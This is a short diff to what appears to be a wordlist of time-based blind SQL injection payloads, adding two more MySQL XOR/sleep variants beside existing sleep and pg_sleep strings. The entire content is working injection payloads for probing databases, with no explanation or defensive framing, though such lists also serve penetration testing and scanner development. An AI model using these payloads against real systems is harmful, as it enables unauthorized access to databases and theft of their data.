@@ -40,3 +40,7 @@ if(now()=sysdate(),sleep(10),0)
 desc%2c(select*from(select(sleep(10)))a)
 -1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(10))A))
 'OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:10') THEN (SELECT '1'||PG_SLEEP(10)) ELSE '0' END)='1
+0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z
+XOR(if(now()=sysdate(),sleep(7),0))XOR%23
+
+
